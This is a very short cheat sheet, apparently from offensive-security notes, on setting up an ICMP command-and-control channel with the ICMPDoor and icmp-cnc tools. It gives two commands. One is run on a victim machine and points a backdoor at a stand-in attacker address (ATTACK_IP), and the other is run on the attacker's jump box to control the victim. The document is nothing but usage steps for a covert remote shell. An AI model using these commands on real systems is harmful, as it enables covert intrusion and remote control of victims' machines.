# ICMP C2

## Binaries: ICMPDoor, icmp-cnc

### 1) Victim: 

    sudo icmpdoor -i INTERFACE -d ATTACK_IP

### 2) Jumbox: 

    sudo icmp-cnc -i INTERFACE -d VICTIM_IP
